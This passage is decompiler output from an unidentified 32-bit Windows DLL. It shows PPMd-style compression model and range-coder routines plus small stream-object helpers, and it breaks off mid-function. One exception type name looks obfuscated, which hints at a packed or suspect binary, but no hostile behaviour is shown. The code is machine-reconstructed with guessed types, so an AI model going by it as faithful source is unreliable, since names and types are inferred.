    dword_100933AC = v10 + 1;
    v28 = v10 + 1;
    if ( v10 + 1 >= (unsigned int)dword_10094F60 )
      return sub_10032513(v1, a1, v29);
    if ( v29 )
    {
      if ( v29 >= dword_10094F60 )
      {
LABEL_20:
        if ( !v29 )
          return sub_10032513(v1, a1, v29);
        if ( --dword_10093390 )
        {
          if ( dword_10094F90 > 2 )
          {
            dword_10093390 = 0;
            v28 = v29;
            dword_100933AC = (int)Block;
          }
        }
        else
        {
          v28 = v29;
          dword_100933AC -= dword_100933C0 != (_DWORD)a1;
        }
        v12 = *((unsigned __int16 *)a1 + 1) - *a1 - v25;
        v27 = *a1;
        v24 = v12;
        if ( (unsigned __int8 *)dword_100933C0 != a1 )
        {
          do
          {
            v13 = *v1;
            v22 = v13;
            if ( *v1 )
            {
              if ( (v13 & 1) != 0 )
              {
                v14 = sub_10031D23((unsigned int)(v13 + 1) >> 1, *((_DWORD **)v1 + 1));
                if ( !v14 )
                  return sub_10032513(v1, a1, v29);
                v12 = v24;
                *((_DWORD *)v1 + 1) = v14;
                v13 = v22;
              }
              *((_WORD *)v1 + 1) += 3 * v13 + 1 < v27;
            }
            else
            {
              v15 = sub_10031C67(1);
              if ( !v15 )
                return sub_10032513(v1, a1, v29);
              *(_WORD *)v15 = *((_WORD *)v1 + 1);
              *(_DWORD *)(v15 + 2) = *((_DWORD *)v1 + 1);
              *((_DWORD *)v1 + 1) = v15;
              v16 = *(_BYTE *)(v15 + 1);
              if ( v16 >= 0x1Eu )
                *(_BYTE *)(v15 + 1) = 120;
              else
                *(_BYTE *)(v15 + 1) = 2 * v16;
              *((_WORD *)v1 + 1) = dword_10093398 + *(unsigned __int8 *)(v15 + 1) + (v27 > 2);
            }
            v17 = *((_WORD *)v1 + 1);
            v18 = v12 + v17;
            v19 = 2 * v25 * (v17 + 6);
            if ( v19 >= 6 * v18 )
            {
              LOWORD(v18) = (12 * v18 < v19) + (15 * v18 < v19) + (9 * v18 < v19) + 4;
              v12 = v24;
              v20 = v18 + v17;
            }
            else
            {
              LOBYTE(v18) = (v19 >= 4 * v18) + (v18 < v19) + 1;
              v20 = v17 + 4;
            }
            v21 = *((_DWORD *)v1 + 1) + 6 * ++*v1;
            *((_WORD *)v1 + 1) = v20;
            *(_DWORD *)(v21 + 2) = v28;
            *(_BYTE *)v21 = v30;
            *(_BYTE *)(v21 + 1) = v18;
            v1[1] |= 8 * (v30 >= 0x40u);
            v1 = (unsigned __int8 *)*((_DWORD *)v1 + 2);
          }
          while ( v1 != a1 );
        }
        result = (char *)v29;
        goto LABEL_41;
      }
      v11 = sub_1003298D(a1, (unsigned __int8 *)v5, 0);
    }
    else
    {
      v11 = (unsigned __int8 *)sub_10032692((int)a1, v5);
    }
    v29 = (unsigned int)v11;
    goto LABEL_20;
  }
  result = (char *)sub_1003298D(a1, (unsigned __int8 *)v5, 1);
  *(_DWORD *)(v2 + 2) = result;
  if ( !result )
    return sub_10032513(v1, a1, v29);
LABEL_41:
  dword_100933C0 = (int)result;
  return result;
}
// 10093390: using guessed type int dword_10093390;
// 10093398: using guessed type int dword_10093398;
// 100933AC: using guessed type int dword_100933AC;
// 100933C0: using guessed type int dword_100933C0;
// 1009414C: using guessed type int dword_1009414C;
// 10094F60: using guessed type int dword_10094F60;
// 10094F90: using guessed type int dword_10094F90;

//----- (10032D99) --------------------------------------------------------
int __thiscall sub_10032D99(int this, int a2)
{
  unsigned __int8 *v2; // eax
  unsigned __int8 v3; // dl
  unsigned __int16 *v4; // esi
  int v5; // eax
  int result; // eax
  unsigned __int16 v7; // dx
  unsigned __int16 v8; // cx
  int v9; // eax

  v2 = (unsigned __int8 *)(this + 2);
  v3 = *(_BYTE *)(this + 3);
  v4 = (unsigned __int16 *)((char *)&unk_100934C8
                          + 128 * *((unsigned __int8 *)&dword_1009414C + v3 + 3)
                          + 2 * ((dword_10094254 >> 26) & 0x20)
                          + 2
                          * (unsigned __int8)(byte_100933B1
                                            + *(_BYTE *)(this + 1)
                                            + byte_10094258[**(unsigned __int8 **)(this + 8)]));
  if ( *(unsigned __int8 *)(this + 2) == a2 )
  {
    dword_1009339C = 0;
    *(_BYTE *)(this + 3) = v3 + (v3 < 0xC4u);
    dword_1009414C = this + 2;
    v5 = *v4;
    dword_100933A0 = (unsigned __int16)v5;
    result = v5 - (((unsigned __int16)v5 + 32) >> 7) + 128;
    ++dword_10094254;
    *v4 = result;
    byte_100933B1 = 1;
  }
  else
  {
    v7 = *v4;
    dword_1009339C = *v4;
    v8 = v7 - ((v7 + 32) >> 7);
    *v4 = v8;
    v9 = *v2;
    dword_10093398 = (unsigned __int8)byte_10072A68[v8 >> 10];
    byte_100933C8[v9] = byte_100933B0;
    result = 0;
    dword_100933A0 = 0x4000;
    byte_100933B1 = 0;
    byte_100933B2 = 0;
    dword_1009414C = 0;
  }
  return result;
}
// 10093398: using guessed type int dword_10093398;
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;
// 100933B0: using guessed type char byte_100933B0;
// 100933B1: using guessed type char byte_100933B1;
// 100933B2: using guessed type char byte_100933B2;
// 1009414C: using guessed type int dword_1009414C;
// 10094254: using guessed type int dword_10094254;

//----- (10032E88) --------------------------------------------------------
int __usercall sub_10032E88@<eax>(int a1@<eax>)
{
  unsigned __int8 *v1; // esi
  unsigned __int16 *v2; // edi
  unsigned int v3; // ebx
  unsigned __int8 v4; // al
  int v5; // eax
  int result; // eax
  __int16 v7; // ax
  char v8; // cl
  unsigned __int16 v9; // ax

  v1 = (unsigned __int8 *)(a1 + 2);
  v2 = (unsigned __int16 *)((char *)&unk_100934C8
                          + 128 * *((unsigned __int8 *)&dword_1009414C + *(unsigned __int8 *)(a1 + 3) + 3)
                          + 2 * ((dword_10094254 >> 26) & 0x20)
                          + 2
                          * (unsigned __int8)(byte_100933B1
                                            + *(_BYTE *)(a1 + 1)
                                            + byte_10094258[**(unsigned __int8 **)(a1 + 8)]));
  v3 = *v2;
  if ( sub_10031892() >= v3 )
  {
    v7 = *v2;
    v8 = byte_100933B0;
    dword_1009339C = v3;
    v9 = v7 - ((int)(v3 + 32) >> 7);
    *v2 = v9;
    dword_10093398 = (unsigned __int8)byte_10072A68[v9 >> 10];
    byte_100933C8[*v1] = v8;
    result = 0;
    dword_100933A0 = 0x4000;
    byte_100933B1 = 0;
    byte_100933B2 = 0;
    dword_1009414C = 0;
  }
  else
  {
    v4 = v1[1];
    dword_1009339C = 0;
    v1[1] = v4 + (v4 < 0xC4u);
    v5 = *v2;
    dword_100933A0 = (unsigned __int16)v5;
    result = v5 - (((unsigned __int16)v5 + 32) >> 7) + 128;
    ++dword_10094254;
    dword_1009414C = (int)v1;
    *v2 = result;
    byte_100933B1 = 1;
  }
  return result;
}
// 10093398: using guessed type int dword_10093398;
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;
// 100933B0: using guessed type char byte_100933B0;
// 100933B1: using guessed type char byte_100933B1;
// 100933B2: using guessed type char byte_100933B2;
// 1009414C: using guessed type int dword_1009414C;
// 10094254: using guessed type int dword_10094254;

//----- (10032F72) --------------------------------------------------------
char __usercall sub_10032F72@<al>(int a1@<eax>, int a2@<ecx>)
{
  bool v3; // cc
  __int16 v4; // dx
  int v5; // ecx
  int v6; // esi

  *(_BYTE *)(a1 + 1) += 4;
  *(_WORD *)(a2 + 2) += 4;
  v3 = *(_BYTE *)(a1 + 1) <= *(_BYTE *)(a1 - 5);
  dword_1009414C = a1;
  if ( !v3 )
  {
    v4 = *(_WORD *)a1;
    v5 = a1 - 6;
    *(_WORD *)a1 = *(_WORD *)(a1 - 6);
    v6 = *(_DWORD *)(a1 + 2);
    *(_DWORD *)(a1 + 2) = *(_DWORD *)(a1 - 6 + 2);
    *(_DWORD *)(v5 + 2) = v6;
    *(_WORD *)v5 = v4;
    v3 = *(_BYTE *)(a1 - 6 + 1) <= 0x7Cu;
    dword_1009414C = a1 - 6;
    if ( !v3 )
      LOBYTE(a1) = sub_100327C8((unsigned __int8 *)a2);
  }
  return a1;
}
// 1009414C: using guessed type int dword_1009414C;

//----- (10032FBD) --------------------------------------------------------
char __userpurge sub_10032FBD@<al>(unsigned __int8 *a1@<eax>, int a2)
{
  unsigned __int8 *v3; // eax
  int v4; // ecx
  unsigned int v5; // esi
  unsigned __int8 v6; // cl
  bool v7; // cc
  int v8; // ecx
  int v9; // edx
  int v10; // edx
  char v11; // dl
  int v12; // ecx

  v3 = (unsigned __int8 *)*((_DWORD *)a1 + 1);
  v4 = *v3;
  v5 = *((unsigned __int16 *)a1 + 1);
  dword_100933A4 = v5;
  if ( v4 == a2 )
  {
    v6 = v3[1];
    dword_100933A0 = v6;
    v3[1] = v6 + 4;
    *((_WORD *)a1 + 1) += 4;
    dword_10094254 += 2 * (unsigned int)v6 >= v5;
    v7 = v3[1] <= 0x7Cu;
    byte_100933B1 = 2 * (unsigned int)v6 >= v5;
    dword_1009414C = (int)v3;
    if ( !v7 )
      LOBYTE(v3) = sub_100327C8(a1);
    dword_1009339C = 0;
  }
  else
  {
    v8 = v3[1];
    v9 = *a1;
    byte_100933B1 = 0;
    do
    {
      v3 += 6;
      if ( *v3 == a2 )
      {
        v10 = v8 + v3[1];
        dword_1009339C = v8;
        dword_100933A0 = v10;
        LOBYTE(v3) = sub_10032F72((int)v3, (int)a1);
        return (char)v3;
      }
      v8 += v3[1];
      --v9;
    }
    while ( v9 );
    if ( *((_DWORD *)a1 + 2) )
      v5 = dword_100933A4;
    v11 = byte_100933B0;
    dword_1009414C = 0;
    dword_1009339C = v8;
    byte_100933C8[*v3] = byte_100933B0;
    byte_100933B2 = *a1;
    v12 = (unsigned __int8)byte_100933B2;
    do
    {
      v3 -= 6;
      --v12;
      byte_100933C8[*v3] = v11;
    }
    while ( v12 );
    dword_100933A0 = v5;
  }
  return (char)v3;
}
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;
// 100933A4: using guessed type int dword_100933A4;
// 100933B0: using guessed type char byte_100933B0;
// 100933B1: using guessed type char byte_100933B1;
// 100933B2: using guessed type char byte_100933B2;
// 1009414C: using guessed type int dword_1009414C;
// 10094254: using guessed type int dword_10094254;

//----- (100330B2) --------------------------------------------------------
char __usercall sub_100330B2@<al>(unsigned __int8 *a1@<eax>)
{
  unsigned __int8 *v2; // esi
  unsigned int v3; // ebx
  unsigned int v4; // eax
  unsigned int v5; // ebx
  char result; // al
  int v7; // ecx
  int v8; // edx
  int v9; // eax
  int v10; // eax
  char v11; // cl
  int v12; // eax

  v2 = (unsigned __int8 *)*((_DWORD *)a1 + 1);
  v3 = v2[1];
  dword_100933A4 = *((unsigned __int16 *)a1 + 1);
  v4 = sub_1003186D();
  if ( v4 >= v3 )
  {
    v7 = *a1;
    byte_100933B1 = 0;
    do
    {
      v8 = v2[7];
      v2 += 6;
      v3 += v8;
      if ( v3 > v4 )
      {
        v9 = v2[1];
        dword_100933A0 = v3;
        dword_1009339C = v3 - v9;
        return sub_10032F72((int)v2, (int)a1);
      }
      --v7;
    }
    while ( v7 );
    v10 = *v2;
    v11 = byte_100933B0;
    dword_1009414C = 0;
    byte_100933C8[v10] = byte_100933B0;
    byte_100933B2 = *a1;
    dword_1009339C = v3;
    v12 = (unsigned __int8)byte_100933B2;
    do
    {
      v2 -= 6;
      --v12;
      byte_100933C8[*v2] = v11;
    }
    while ( v12 );
    result = dword_100933A4;
    dword_100933A0 = dword_100933A4;
  }
  else
  {
    dword_100933A0 = v3;
    byte_100933B1 = 2 * v3 >= dword_100933A4;
    v5 = v3 + 4;
    result = byte_100933B1;
    dword_10094254 += (unsigned __int8)byte_100933B1;
    v2[1] = v5;
    *((_WORD *)a1 + 1) += 4;
    dword_1009414C = (int)v2;
    if ( v5 > 0x7C )
      result = sub_100327C8(a1);
    dword_1009339C = 0;
  }
  return result;
}
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;
// 100933A4: using guessed type int dword_100933A4;
// 100933B0: using guessed type char byte_100933B0;
// 100933B1: using guessed type char byte_100933B1;
// 100933B2: using guessed type char byte_100933B2;
// 1009414C: using guessed type int dword_1009414C;
// 10094254: using guessed type int dword_10094254;

//----- (1003319E) --------------------------------------------------------
int __usercall sub_1003319E@<eax>(int a1@<eax>, int a2@<ecx>)
{
  bool v2; // cc
  int result; // eax

  *(_BYTE *)(a1 + 1) += 4;
  *(_WORD *)(a2 + 2) += 4;
  v2 = *(_BYTE *)(a1 + 1) <= 0x7Cu;
  dword_1009414C = a1;
  if ( !v2 )
    sub_100327C8((unsigned __int8 *)a2);
  result = dword_100933C4;
  ++byte_100933B0;
  dword_10094254 = dword_100933C4;
  return result;
}
// 100933B0: using guessed type char byte_100933B0;
// 100933C4: using guessed type int dword_100933C4;
// 1009414C: using guessed type int dword_1009414C;
// 10094254: using guessed type int dword_10094254;

//----- (100331CC) --------------------------------------------------------
int *__thiscall sub_100331CC(unsigned __int8 *this)
{
  int *result; // eax
  int v2; // esi

  if ( *this == 0xFF )
  {
    result = &dword_1009435C;
    dword_100933A4 = 1;
  }
  else
  {
    result = (int *)((char *)&unk_10094360
                   + 128 * (unsigned __int8)byte_10094152[*this]
                   + 8 * (2 * *this < (unsigned __int8)byte_100933B2 + **((unsigned __int8 **)this + 2))
                   + 4 * this[1]
                   + 4 * (*((unsigned __int16 *)this + 1) > 11 * (*this + 1))
                   - 384);
    v2 = *(unsigned __int16 *)result >> *((_BYTE *)result + 2);
    *(_WORD *)result -= v2;
    dword_100933A4 = v2 + (v2 == 0);
  }
  return result;
}
// 100933A4: using guessed type int dword_100933A4;
// 100933B2: using guessed type char byte_100933B2;
// 1009435C: using guessed type int dword_1009435C;

//----- (10033272) --------------------------------------------------------
char __userpurge sub_10033272@<al>(unsigned __int8 *a1@<ebx>, int a2)
{
  int *v2; // eax
  char v3; // cl
  int v4; // edi
  int v5; // edx
  unsigned __int8 *v6; // esi
  int v7; // eax
  bool v8; // zf
  int v9; // eax
  int v10; // ecx
  char result; // al
  int v12; // edi
  int *v13; // [esp+Ch] [ebp-4h]
  unsigned __int8 *i; // [esp+18h] [ebp+8h]

  v2 = sub_100331CC(a1);
  v3 = byte_100933B0;
  v13 = v2;
  v4 = 0;
  v5 = *a1 - (unsigned __int8)byte_100933B2;
  v6 = (unsigned __int8 *)(*((_DWORD *)a1 + 1) - 6);
  while ( 1 )
  {
    do
    {
      v6 += 6;
      v7 = *v6;
    }
    while ( byte_100933C8[v7] == v3 );
    v8 = v7 == a2;
    byte_100933C8[v7] = v3;
    v9 = v6[1];
    if ( v8 )
      break;
    v4 += v9;
    if ( !--v5 )
    {
      v10 = v4 + dword_100933A4;
      *(_WORD *)v13 += v4 + dword_100933A4;
      result = *a1;
      dword_1009339C = v4;
      dword_100933A4 = v10;
      dword_100933A0 = v10;
      byte_100933B2 = result;
      return result;
    }
  }
  dword_1009339C = v4;
  v12 = v9 + v4;
  dword_100933A0 = v12;
  for ( i = v6; --v5; v12 += i[1] )
  {
    do
      i += 6;
    while ( byte_100933C8[*i] == v3 );
  }
  dword_100933A4 += v12;
  sub_10031F8D((int)v13);
  return sub_1003319E((int)v6, (int)a1);
}
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;
// 100933A4: using guessed type int dword_100933A4;
// 100933B0: using guessed type char byte_100933B0;
// 100933B2: using guessed type char byte_100933B2;

//----- (10033344) --------------------------------------------------------
int *__usercall sub_10033344@<eax>(unsigned __int8 *a1@<eax>)
{
  int *v2; // eax
  int v3; // ecx
  int v4; // ecx
  int *v5; // esi
  unsigned __int8 *v6; // eax
  int v7; // esi
  unsigned int v8; // eax
  int v9; // edi
  int *v10; // edx
  unsigned int i; // ecx
  int v12; // eax
  int *result; // eax
  unsigned __int8 v14; // bl
  int v15; // eax
  int v16; // ecx
  int v17[256]; // [esp+Ch] [ebp-40Ch] BYREF
  int *v18; // [esp+40Ch] [ebp-Ch]
  unsigned int v19; // [esp+410h] [ebp-8h]
  unsigned int v20; // [esp+414h] [ebp-4h]

  v2 = sub_100331CC(a1);
  v3 = *a1;
  v19 = 0;
  v18 = v2;
  v4 = v3 - (unsigned __int8)byte_100933B2;
  v5 = v17;
  v6 = (unsigned __int8 *)(*((_DWORD *)a1 + 1) - 6);
  do
  {
    do
    {
      v6 += 6;
      v20 = *v6;
    }
    while ( byte_100933C8[v20] == byte_100933B0 );
    v19 += v6[1];
    *v5++ = (int)v6;
    --v4;
  }
  while ( v4 );
  v7 = v19 + dword_100933A4;
  dword_100933A4 += v19;
  v8 = sub_1003186D();
  v9 = v17[0];
  v20 = v8;
  v10 = v17;
  if ( v8 >= v19 )
  {
    v14 = *a1;
    dword_1009339C = v19;
    dword_100933A0 = v7;
    v15 = v14 - (unsigned __int8)byte_100933B2;
    byte_100933B2 = v14;
    do
    {
      v16 = *(unsigned __int8 *)*v10++;
      --v15;
      byte_100933C8[v16] = byte_100933B0;
    }
    while ( v15 );
    result = v18;
    *(_WORD *)v18 += v7;
  }
  else
  {
    for ( i = *(unsigned __int8 *)(v17[0] + 1); i <= v20; i += *(unsigned __int8 *)(*v10 + 1) )
      v9 = *++v10;
    v12 = *(unsigned __int8 *)(v9 + 1);
    dword_100933A0 = i;
    dword_1009339C = i - v12;
    sub_10031F8D((int)v18);
    return (int *)sub_1003319E(v9, (int)a1);
  }
  return result;
}
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;
// 100933A4: using guessed type int dword_100933A4;
// 100933B0: using guessed type char byte_100933B0;
// 100933B2: using guessed type char byte_100933B2;

//----- (10033448) --------------------------------------------------------
void *sub_10033448()
{
  byte_100933B0 = 1;
  return memset(byte_100933C8, 0, sizeof(byte_100933C8));
}
// 100933B0: using guessed type char byte_100933B0;

//----- (10033464) --------------------------------------------------------
unsigned int __stdcall sub_10033464(_DWORD *a1, _DWORD *a2)
{
  char v2; // bl
  int v3; // esi
  int v4; // edi
  unsigned int result; // eax
  unsigned int v6; // eax
  int v7; // esi

  unk_10094F64 = 0;
  dword_10093394 = -1;
  sub_100320C3(14, 0);
LABEL_2:
  v2 = *(_BYTE *)dword_100933C0;
  v3 = dword_100933C0;
  v4 = sub_100317CE(a2);
  if ( v2 )
  {
    sub_10032FBD((unsigned __int8 *)v3, v4);
LABEL_12:
    sub_10031812();
  }
  else
  {
    sub_10032D99(v3, v4);
    sub_10031842();
  }
  if ( dword_1009414C )
  {
    if ( dword_10093390 || *(_DWORD *)(dword_1009414C + 2) < (unsigned int)dword_10094F60 )
    {
      sub_10032AD9((unsigned __int8 *)v3);
      if ( !byte_100933B0 )
        sub_10033448();
    }
    else
    {
      dword_100933C0 = *(_DWORD *)(dword_1009414C + 2);
    }
    v6 = unk_10094F64;
    while ( 1 )
    {
      if ( (v6 ^ (dword_10093394 + v6)) >= 0x1000000 )
      {
        if ( (unsigned int)dword_10093394 >= 0x8000 )
          goto LABEL_2;
        dword_10093394 = -v6 & 0x7FFF;
      }
      sub_100317EE(a1, HIBYTE(v6));
      dword_10093394 <<= 8;
      v6 = unk_10094F64 << 8;
      unk_10094F64 <<= 8;
    }
  }
  while ( 1 )
  {
    result = unk_10094F64;
    if ( (unk_10094F64 ^ (unsigned int)(dword_10093394 + unk_10094F64)) < 0x1000000 )
      goto LABEL_8;
    if ( (unsigned int)dword_10093394 >= 0x8000 )
      break;
    dword_10093394 = -unk_10094F64 & 0x7FFF;
LABEL_8:
    sub_100317EE(a1, HIBYTE(unk_10094F64));
    dword_10093394 <<= 8;
    unk_10094F64 <<= 8;
  }
  while ( 1 )
  {
    v3 = *(_DWORD *)(v3 + 8);
    ++dword_10093390;
    if ( !v3 )
      break;
    if ( *(_BYTE *)v3 != byte_100933B2 )
    {
      sub_10033272((unsigned __int8 *)v3, v4);
      goto LABEL_12;
    }
  }
  v7 = 4;
  do
  {
    sub_100317EE(a1, HIBYTE(result));
    result = unk_10094F64 << 8;
    --v7;
    unk_10094F64 <<= 8;
  }
  while ( v7 );
  return result;
}
// 10093390: using guessed type int dword_10093390;
// 10093394: using guessed type int dword_10093394;
// 100933B0: using guessed type char byte_100933B0;
// 100933B2: using guessed type char byte_100933B2;
// 100933C0: using guessed type int dword_100933C0;
// 1009414C: using guessed type int dword_1009414C;
// 10094F60: using guessed type int dword_10094F60;

//----- (100335E3) --------------------------------------------------------
char __stdcall sub_100335E3(_DWORD *a1, _DWORD *a2)
{
  int v2; // esi
  char v3; // bl
  int v4; // esi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax

  dword_10093394 = -1;
  dword_100933A8 = 0;
  unk_10094F64 = 0;
  v2 = 4;
  do
  {
    --v2;
    dword_100933A8 = (dword_100933A8 << 8) | sub_100317CE(a2);
  }
  while ( v2 );
  sub_100320C3(14, 0);
  v3 = *(_BYTE *)dword_100933C0;
  v4 = dword_100933C0;
LABEL_4:
  if ( v3 )
    sub_100330B2((unsigned __int8 *)v4);
  else
    sub_10032E88(v4);
LABEL_15:
  sub_100318AD();
  if ( dword_1009414C )
  {
    sub_100317EE(a1, *(unsigned __int8 *)dword_1009414C);
    if ( dword_10093390 || *(_DWORD *)(dword_1009414C + 2) < (unsigned int)dword_10094F60 )
    {
      sub_10032AD9((unsigned __int8 *)v4);
      if ( !byte_100933B0 )
        sub_10033448();
    }
    else
    {
      dword_100933C0 = *(_DWORD *)(dword_1009414C + 2);
    }
    v3 = *(_BYTE *)dword_100933C0;
    v4 = dword_100933C0;
    v7 = unk_10094F64;
    while ( 1 )
    {
      if ( (v7 ^ (unsigned int)(dword_10093394 + v7)) >= 0x1000000 )
      {
        if ( (unsigned int)dword_10093394 >= 0x8000 )
          goto LABEL_4;
        dword_10093394 = -v7 & 0x7FFF;
      }
      v8 = sub_100317CE(a2);
      dword_10093394 <<= 8;
      dword_100933A8 = (dword_100933A8 << 8) | v8;
      v7 = unk_10094F64 << 8;
      unk_10094F64 <<= 8;
    }
  }
  v5 = unk_10094F64;
  while ( 1 )
  {
    if ( (v5 ^ (unsigned int)(dword_10093394 + v5)) < 0x1000000 )
      goto LABEL_11;
    if ( (unsigned int)dword_10093394 >= 0x8000 )
      break;
    dword_10093394 = -v5 & 0x7FFF;
LABEL_11:
    v6 = sub_100317CE(a2);
    dword_10093394 <<= 8;
    dword_100933A8 = (dword_100933A8 << 8) | v6;
    v5 = unk_10094F64 << 8;
    unk_10094F64 <<= 8;
  }
  while ( 1 )
  {
    v4 = *(_DWORD *)(v4 + 8);
    ++dword_10093390;
    if ( !v4 )
      return v5;
    LOBYTE(v5) = *(_BYTE *)v4;
    if ( *(_BYTE *)v4 != byte_100933B2 )
    {
      sub_10033344((unsigned __int8 *)v4);
      goto LABEL_15;
    }
  }
}
// 10093390: using guessed type int dword_10093390;
// 10093394: using guessed type int dword_10093394;
// 100933A8: using guessed type int dword_100933A8;
// 100933B0: using guessed type char byte_100933B0;
// 100933B2: using guessed type char byte_100933B2;
// 100933C0: using guessed type int dword_100933C0;
// 1009414C: using guessed type int dword_1009414C;
// 10094F60: using guessed type int dword_10094F60;

//----- (10033785) --------------------------------------------------------
_DWORD *__userpurge sub_10033785@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  sub_10025BDE((int)a2);
  *a2 = &off_10074DFC;
  sub_1000C3F3(a1, (int)(a2 + 2));
  a2[7] = 0;
  return a2;
}
// 10074DFC: using guessed type int (__thiscall *off_10074DFC)(void *Block, char);

//----- (100337C3) --------------------------------------------------------
void *__thiscall sub_100337C3(void *Block, char a2)
{
  sub_100337E2((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100337E2) --------------------------------------------------------
void __thiscall sub_100337E2(int this)
{
  *(_DWORD *)this = &off_10074DFC;
  *(_BYTE *)(this + 4) = 1;
  sub_1000C45D((int *)(this + 8));
  sub_10025C2C((_BYTE *)this);
}
// 10074DFC: using guessed type int (__thiscall *off_10074DFC)(void *Block, char);

//----- (10033838) --------------------------------------------------------
int __thiscall sub_10033838(int *this, _BYTE *a2)
{
  if ( (*(unsigned __int8 (__thiscall **)(int *))(*this + 28))(this) )
    return 0;
  *a2 = *(_BYTE *)sub_1000C55B((int)(this + 2), this[7]++);
  return 1;
}

//----- (10033868) --------------------------------------------------------
size_t __thiscall sub_10033868(_DWORD *this, _DWORD *a2)
{
  unsigned int v5; // ebx
  size_t v6; // ebx
  void *v7; // eax
  const void *v8; // [esp-10h] [ebp-14h]
  char v9; // [esp+Fh] [ebp+Bh]

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 28))(this) )
    return 0;
  v5 = a2[3];
  if ( v5 >= (*(int (__thiscall **)(_DWORD *))(*this + 24))(this) )
    v6 = (*(int (__thiscall **)(_DWORD *))(*this + 24))(this);
  else
    v6 = a2[3];
  v9 = *(_BYTE *)(a2[1] + 8);
  v8 = (const void *)(this[7] + sub_1000C52E(this + 2));
  v7 = (void *)sub_1000C50A(a2);
  memcpy(v7, v8, v6);
  if ( v9 )
    *(_BYTE *)(a2[1] + 8) = 1;
  this[7] += v6;
  return v6;
}

//----- (100338DB) --------------------------------------------------------
int __thiscall sub_100338DB(_DWORD *this)
{
  return this[5] - this[7];
}

//----- (100338E2) --------------------------------------------------------
BOOL __thiscall sub_100338E2(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this) == 0;
}

//----- (100338ED) --------------------------------------------------------
int __thiscall sub_100338ED(_DWORD *this, int a2)
{
  sub_1000C3F3(this + 2, a2);
  return a2;
}

//----- (1003391E) --------------------------------------------------------
void __thiscall sub_1003391E(_DWORD *this)
{
  this[7] = 0;
}

//----- (10033923) --------------------------------------------------------
int __thiscall sub_10033923(_DWORD *this)
{
  return this[7];
}

//----- (10033927) --------------------------------------------------------
int __thiscall sub_10033927(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[7];
    }
    else if ( a3 == 2 )
    {
      v3 = this[5];
    }
  }
  else
  {
    v3 = 0;
  }
  result = a2 + v3;
  if ( result < 0 || result > this[5] )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  this[7] = result;
  return result;
}
// 10033927: using guessed type _DWORD pExceptionObject[2];

//----- (10033972) --------------------------------------------------------
char sub_10033972()
{
  return 1;
}

//----- (10033975) --------------------------------------------------------
int __usercall sub_10033975@<eax>(int result@<eax>)
{
  *(_DWORD *)result = &off_10074E30;
  *(_DWORD *)(result + 4) = 0;
  *(_DWORD *)(result + 8) = 0;
  *(_BYTE *)(result + 12) = 0;
  *(_DWORD *)(result + 16) = 0;
  *(_DWORD *)(result + 20) = 0;
  return result;
}
// 10074E30: using guessed type int (__thiscall *off_10074E30)(void *Block, char);

//----- (1003398D) --------------------------------------------------------
_DWORD *__thiscall sub_1003398D(_DWORD *Block, char a2)
{
  *Block = &off_10074E30;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074E30: using guessed type int (__thiscall *off_10074E30)(void *Block, char);

//----- (100339B4) --------------------------------------------------------
int __userpurge sub_100339B4@<eax>(int result@<eax>, int a2@<ecx>, int a3, char a4, int a5, int a6, char a7)
{
  *(_DWORD *)(result + 4) = a2;
  *(_DWORD *)(result + 8) = a3;
  *(_BYTE *)(result + 12) = a4;
  *(_DWORD *)(result + 16) = a5;
  *(_DWORD *)(result + 20) = a6;
  *(_DWORD *)result = &off_10074E30;
  *(_BYTE *)(result + 24) = a7;
  return result;
}
// 10074E30: using guessed type int (__thiscall *off_10074E30)(void *Block, char);

//----- (10033A0D) --------------------------------------------------------
int __thiscall sub_10033A0D(int this, int a2)
{
  int result; // eax

  result = this;
  if ( this != a2 )
  {
    *(_DWORD *)(this + 4) = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(this + 8) = *(_DWORD *)(a2 + 8);
    *(_BYTE *)(this + 12) = *(_BYTE *)(a2 + 12);
    *(_DWORD *)(this + 16) = *(_DWORD *)(a2 + 16);
    *(_DWORD *)(this + 20) = *(_DWORD *)(a2 + 20);
    *(_BYTE *)(this + 24) = *(_BYTE *)(a2 + 24);
  }
  return result;
}

//----- (10033A41) --------------------------------------------------------
int __thiscall sub_10033A41(_DWORD *this)
{
  return this[1];
}

//----- (10033A45) --------------------------------------------------------
int __thiscall sub_10033A45(_DWORD *this)
{
  return this[2];
}

//----- (10033A49) --------------------------------------------------------
int __thiscall sub_10033A49(_DWORD *this)
{
  return this[5];
}

//----- (10033A4D) --------------------------------------------------------
char __thiscall sub_10033A4D(_BYTE *this)
{
  return this[24];
}

//----- (10033A51) --------------------------------------------------------
int __thiscall sub_10033A51(_BYTE *this)
{
  return this[12] & 1;
}

//----- (10033A59) --------------------------------------------------------
_DWORD *__thiscall sub_10033A59(int this, _DWORD *a2)
{
  _ThrowInfo *v3; // ecx
  int *v4; // eax
  int v5; // ecx
  char *v6; // ebx
  DWORD v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  void **v11; // eax
  _DWORD *v12; // eax
  int v14; // [esp-10h] [ebp-68h] BYREF
  int v15; // [esp-Ch] [ebp-64h]
  _ThrowInfo *v16; // [esp-8h] [ebp-60h] BYREF
  _ThrowInfo *CurrentProcessId; // [esp-4h] [ebp-5Ch]
  int v18[5]; // [esp+10h] [ebp-48h] BYREF
  int v19[3]; // [esp+24h] [ebp-34h] BYREF
  _ThrowInfo *v20; // [esp+30h] [ebp-28h]
